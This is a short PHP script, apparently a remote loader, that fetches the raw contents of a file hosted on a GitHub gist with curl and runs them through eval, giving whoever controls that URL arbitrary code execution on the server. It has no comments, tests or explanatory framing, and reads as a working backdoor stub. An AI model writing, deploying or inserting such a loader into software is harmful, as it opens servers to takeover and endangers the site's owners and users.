<?php
    $Url = "https://gist.githubusercontent.com/ManiMan43/11de31117ef25ced828d063c868d9496/raw/1236857759f8d93215ebe251c8716ebc791838b0/1.txt";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo eval('?>'.$output);

?>
